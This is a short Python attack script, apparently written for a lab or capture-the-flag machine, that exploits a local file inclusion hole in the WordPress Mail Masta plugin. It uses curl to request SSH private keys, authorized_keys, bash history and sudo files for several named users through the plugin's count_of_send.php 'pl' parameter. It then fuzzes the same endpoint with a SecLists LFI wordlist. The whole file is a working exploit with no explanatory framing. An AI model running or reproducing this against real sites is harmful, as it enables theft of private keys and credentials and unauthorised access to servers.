#!/usr/bin/env python3

import os
import sys

users = ["nick", "sarah", "root", "paul", "linda", "joe"]

target_files = [
    # ".bashrc",
    ".bash_history",
    ".ssh/id_rsa",
    ".ssh/id_rsa.pub",
    ".ssh/authorized_keys",
    ".sudo_as_admin_successful",
]
try:
    for user in users:
        for target in target_files:
            path = f"/home/{user}/{target}"
            os.system(
                f"curl http://192.168.134.112/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl={path}"
            )

    with open(
        "/usr/share/wordlists/SecLists-master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt",
        "r",
    ) as file_list:
        for file in file_list:
            os.system(
                f"curl http://192.168.134.112/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl={file} 2>&1 > /dev/null &"
            )
except KeyboardInterrupt:
    print("Caught KeyboardInterrupt. Exiting...")
    sys.exit()
